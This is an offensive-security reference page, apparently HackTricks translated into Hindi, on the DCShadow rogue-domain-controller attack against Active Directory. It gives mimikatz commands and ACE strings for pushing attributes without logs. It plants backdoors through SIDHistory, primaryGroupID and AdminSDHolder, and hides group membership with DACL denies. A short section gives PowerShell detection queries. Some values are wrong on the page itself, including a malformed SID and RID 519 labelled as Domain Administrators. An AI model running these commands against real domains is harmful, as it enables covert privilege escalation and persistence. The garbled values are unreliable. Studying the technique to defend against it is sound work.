# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

यह AD में एक **new Domain Controller** register करता है और इसका उपयोग निर्दिष्ट objects पर **attributes** (SIDHistory, SPNs...) **push** करने के लिए करता है, तथा **modifications** से संबंधित कोई भी **logs** नहीं छोड़ता। आपको **DA** privileges की आवश्यकता होती है और आपको **root domain** के अंदर होना चाहिए।\
ध्यान दें कि यदि आप गलत data का उपयोग करते हैं, तो काफी खराब logs दिखाई देंगे।<sup>[[2]](#references)</sup>

इस attack को करने के लिए आपको 2 mimikatz instances की आवश्यकता होती है। इनमें से एक SYSTEM privileges के साथ RPC servers शुरू करेगा (आपको यहां वे changes बताने होंगे जिन्हें आप perform करना चाहते हैं), और दूसरे instance का उपयोग values को push करने के लिए किया जाएगा:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
ध्यान दें कि **`elevate::token`** `mimikatz1` session में काम नहीं करेगा, क्योंकि इससे thread के privileges elevate होते हैं, जबकि हमें **process के privilege** को elevate करना है।\
आप "LDAP" object भी चुन सकते हैं: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

आप DA या इन minimal permissions वाले user से changes push कर सकते हैं:

- **domain object** में:
- _DS-Install-Replica_ (Domain में Replica जोड़ना/हटाना)
- _DS-Replication-Manage-Topology_ (Replication Topology manage करना)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- **Configuration container** में **Sites object** (और इसके children):
- _CreateChild and DeleteChild_
- **DC के रूप में registered computer के object** पर:
- _WriteProperty_ (Write नहीं)
- **target object** पर:
- _WriteProperty_ (Write नहीं)

आप किसी unprivileged user को ये privileges देने के लिए [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) का उपयोग कर सकते हैं (ध्यान दें कि इससे कुछ logs रह जाएंगे)। यह DA privileges होने की तुलना में बहुत अधिक restrictive है।\
उदाहरण: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` इसका अर्थ है कि machine _**mcorp-student1**_ पर logged-on होने पर username _**student1**_ को object _**root1user**_ पर DCShadow permissions प्राप्त हैं।

## Backdoors बनाने के लिए DCShadow का उपयोग करना
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group का दुरुपयोग, enumeration gaps और detection

- `primaryGroupID`, group की `member` list से अलग attribute है। DCShadow/DSInternals इसे सीधे लिख सकते हैं (उदाहरण के लिए, **Domain Admins** के लिए `primaryGroupID=512` सेट करना), बिना on-box LSASS enforcement के; लेकिन AD फिर भी user को **move** करता है: PGID बदलने पर पिछले primary group से membership हमेशा हटा दी जाती है (किसी भी target group के लिए यही behavior होता है), इसलिए पुरानी primary-group membership बनाए रखना संभव नहीं है।<sup>[[1]](#references)</sup>
- Default tools user को उसके वर्तमान primary group से हटाने से रोकते हैं (`ADUC`, `Remove-ADGroupMember`), इसलिए PGID बदलने के लिए आमतौर पर direct directory writes (DCShadow/`Set-ADDBPrimaryGroup`) आवश्यक होते हैं।
- Membership reporting असंगत होती है:
- **Primary-group-derived members शामिल करता है:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Primary-group-derived members को छोड़ देता है:** `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit में `member` का निरीक्षण, `Get-ADUser <user> -Properties memberOf`.
- यदि **primary group स्वयं nested** हो, तो recursive checks primary-group members को छोड़ सकते हैं (उदाहरण के लिए, user का PGID, **Domain Admins** के अंदर मौजूद किसी nested group की ओर संकेत करता हो); `Get-ADGroupMember -Recursive` या LDAP recursive filters उस user को return नहीं करेंगे, जब तक recursion primary groups को स्पष्ट रूप से resolve न करे।
- DACL tricks: attackers user पर `primaryGroupID` के लिए (या non-AdminSDHolder groups के लिए group के `member` attribute पर) **deny ReadProperty** सेट कर सकते हैं, जिससे अधिकांश PowerShell queries से effective membership छिप जाती है; `net group` फिर भी membership resolve करेगा। AdminSDHolder-protected groups ऐसे denies को reset कर देंगे।

Detection/monitoring के उदाहरण:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Privileged groups को cross-check करने के लिए `Get-ADGroupMember` के output की तुलना `Get-ADGroup -Properties member` या ADSI Edit से करें, ताकि `primaryGroupID` या hidden attributes द्वारा उत्पन्न discrepancies पकड़ी जा सकें।<sup>[[1]](#references)</sup>

## Shadowception - DCShadow का उपयोग करके DCShadow permissions दें (modified permissions logs के बिना)

हमें अंत में अपने user के SID के साथ निम्नलिखित ACEs append करने हैं:<sup>[[2]](#references)</sup>

- Domain object पर:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Attacker computer object पर: `(A;;WP;;;UserSID)`
- Target user object पर: `(A;;WP;;;UserSID)`
- Configuration container में Sites object पर: `(A;CI;CCDC;;;UserSID)`

किसी object का current ACE प्राप्त करने के लिए: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

इस स्थिति में आपको केवल एक नहीं, बल्कि **कई changes** करने होंगे। **`mimikatz1 session`** (RPC server) में प्रत्येक change के साथ **`/stack` parameter** का उपयोग करें। इसके बाद rogue server से सभी stacked changes लागू करने के लिए आपको केवल एक बार **`/push`** करना होगा।

[**ired.team में DCShadow के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Primary Group के व्यवहार, reporting और exploitation में Adventures](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [ired.team में DCShadow का write-up](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
